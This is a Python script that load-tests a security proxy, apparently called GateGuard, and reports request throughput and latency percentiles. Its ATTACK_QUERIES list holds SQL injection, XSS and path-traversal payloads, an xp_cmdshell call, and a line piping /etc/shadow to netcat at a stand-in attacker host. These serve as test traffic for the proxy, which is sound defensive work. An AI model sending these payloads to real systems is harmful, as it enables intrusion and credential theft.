#!/usr/bin/env python3
"""
GateGuard Fallback Python Load Benchmark Script
------------------------------------------------
Zero-dependency concurrent benchmark tool using standard Python libraries.
Measures throughput (RPS) and latency percentiles (P50, P95, P99).
"""

import argparse
import json
import random
import statistics
import time
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

BENIGN_QUERIES = [
    "incident report",
    "proxy config",
    "system audit",
    "user credentials",
    "database migration",
    "auth policy",
    "admin guidelines",
    "network logs",
    "security compliance"
]

ATTACK_QUERIES = [
    "' OR '1'='1' --",
    "SELECT * FROM users WHERE 1=1",
    "UNION SELECT 1,2,username,password FROM accounts",
    "<script>alert(1)</script>",
    "<iframe src=javascript:alert(document.cookie)>",
    "../../../../etc/passwd",
    "cat /etc/shadow | nc attacker.com",
    "xp_cmdshell 'whoami'"
]


def send_request(url, method="GET", data=None, headers=None):
    """Executes an HTTP request and measures round-trip latency in milliseconds."""
    req_headers = headers or {}
    req_data = None

    if data is not None:
        req_data = json.dumps(data).encode("utf-8")
        req_headers["Content-Type"] = "application/json"

    req = urllib.request.Request(url, data=req_data, headers=req_headers, method=method)

    start_time = time.perf_counter()
    status_code = 0
    success = False

    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            status_code = response.status
            success = 200 <= status_code < 400
    except urllib.error.HTTPError as e:
        status_code = e.code
        # In security proxy tests, 401/403/400 blocks can be valid responses for attack payloads
        success = status_code in (200, 201, 400, 401, 403)
    except Exception as e:
        status_code = 0
        success = False

    latency_ms = (time.perf_counter() - start_time) * 1000.0
    return latency_ms, status_code, success


def simulate_user_session(base_url, requests_per_user):
    """
    Simulates a user flow:
    1. Login once via POST /login to receive session token
    2. Execute multiple benign and attack search queries
    """
    latencies = []
    success_count = 0
    failure_count = 0
    benign_latencies = []
    attack_latencies = []

    # Step 1: Login
    login_url = f"{base_url.rstrip('/')}/login"
    login_payload = {"username": f"user_{random.randint(100, 999)}", "password": "SecretPassword123!"}
    lat, status, ok = send_request(login_url, method="POST", data=login_payload)
    latencies.append(lat)
    if ok:
        success_count += 1
    else:
        failure_count += 1

    token = f"token_{random.randint(1000, 9999)}"
    headers = {"Authorization": f"Bearer {token}"}

    # Step 2: Search queries
    for _ in range(requests_per_user - 1):
        is_attack = random.random() < 0.3  # 30% attack queries
        query = random.choice(ATTACK_QUERIES) if is_attack else random.choice(BENIGN_QUERIES)
        encoded_query = urllib.parse.quote(query)
        search_url = f"{base_url.rstrip('/')}/search?q={encoded_query}"

        lat, status, ok = send_request(search_url, method="GET", headers=headers)
        latencies.append(lat)

        if is_attack:
            attack_latencies.append(lat)
        else:
            benign_latencies.append(lat)

        if ok:
            success_count += 1
        else:
            failure_count += 1

    return latencies, success_count, failure_count, benign_latencies, attack_latencies


def calculate_percentile(data, percentile):
    """Calculates percentile from sorted list of numbers."""
    if not data:
        return 0.0
    sorted_data = sorted(data)
    k = (len(sorted_data) - 1) * (percentile / 100.0)
    f = int(k)
    c = f + 1
    if c >= len(sorted_data):
        return sorted_data[-1]
    d0 = sorted_data[f] * (c - k)
    d1 = sorted_data[c] * (k - f)
    return d0 + d1


def main():
    parser = argparse.ArgumentParser(description="GateGuard Fallback Python Load Benchmark")
    parser.add_argument("--url", default="http://localhost:8080", help="Target URL (e.g. http://localhost:8080)")
    parser.add_argument("--users", type=int, default=50, help="Number of concurrent simulated users/threads (default: 50)")
    parser.add_argument("--requests", type=int, default=500, help="Total requests to execute across all users (default: 500)")
    args = parser.parse_args()

    base_url = args.url
    num_users = args.users
    total_requests = args.requests
    reqs_per_user = max(1, total_requests // num_users)

    print("=" * 70)
    print("🚀 GATEGUARD LOAD BENCHMARK (FALLBACK PYTHON RUNNER)")
    print("=" * 70)
    print(f"Target URL       : {base_url}")
    print(f"Concurrent Users : {num_users}")
    print(f"Total Requests   : {reqs_per_user * num_users}")
    print(f"Requests / User  : {reqs_per_user}")
    print("=" * 70)
    print("Executing benchmark, please wait...\n")

    start_wall_time = time.perf_counter()

    all_latencies = []
    total_success = 0
    total_failures = 0
    all_benign = []
    all_attack = []

    with ThreadPoolExecutor(max_workers=num_users) as executor:
        futures = [executor.submit(simulate_user_session, base_url, reqs_per_user) for _ in range(num_users)]

        for future in as_completed(futures):
            lats, succ, fail, benign_lats, attack_lats = future.result()
            all_latencies.extend(lats)
            total_success += succ
            total_failures += fail
            all_benign.extend(benign_lats)
            all_attack.extend(attack_lats)

    total_wall_time = time.perf_counter() - start_wall_time
    total_req_count = len(all_latencies)
    rps = total_req_count / total_wall_time if total_wall_time > 0 else 0

    p50 = calculate_percentile(all_latencies, 50)
    p95 = calculate_percentile(all_latencies, 95)
    p99 = calculate_percentile(all_latencies, 99)
    avg_lat = statistics.mean(all_latencies) if all_latencies else 0.0
    min_lat = min(all_latencies) if all_latencies else 0.0
    max_lat = max(all_latencies) if all_latencies else 0.0

    print("=" * 70)
    print("📊 GATEGUARD BENCHMARK RESULTS")
    print("=" * 70)
    print(f"Total Requests Executed : {total_req_count}")
    print(f"Successful Responses   : {total_success}")
    print(f"Failed / Error Responses: {total_failures}")
    print(f"Total Wall Time        : {total_wall_time:.2f} s")
    print(f"Throughput (RPS)       : {rps:.2f} req/sec")
    print("-" * 70)
    print("LATENCY METRICS (Overall):")
    print(f"  Min Latency          : {min_lat:.2f} ms")
    print(f"  Avg Latency          : {avg_lat:.2f} ms")
    print(f"  P50 (Median)         : {p50:.2f} ms  <-- Pitch Deck Baseline")
    print(f"  P95 Percentile       : {p95:.2f} ms  <-- Pitch Deck SLA")
    print(f"  P99 Percentile       : {p99:.2f} ms  <-- Tail Latency")
    print(f"  Max Latency          : {max_lat:.2f} ms")

    if all_benign:
        print("-" * 70)
        print("LATENCY BREAKDOWN (Traffic Categories):")
        print(f"  Benign Requests (P50): {calculate_percentile(all_benign, 50):.2f} ms | P95: {calculate_percentile(all_benign, 95):.2f} ms")
    if all_attack:
        print(f"  Attack Requests (P50): {calculate_percentile(all_attack, 50):.2f} ms | P95: {calculate_percentile(all_attack, 95):.2f} ms (Scored via ML)")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    main()
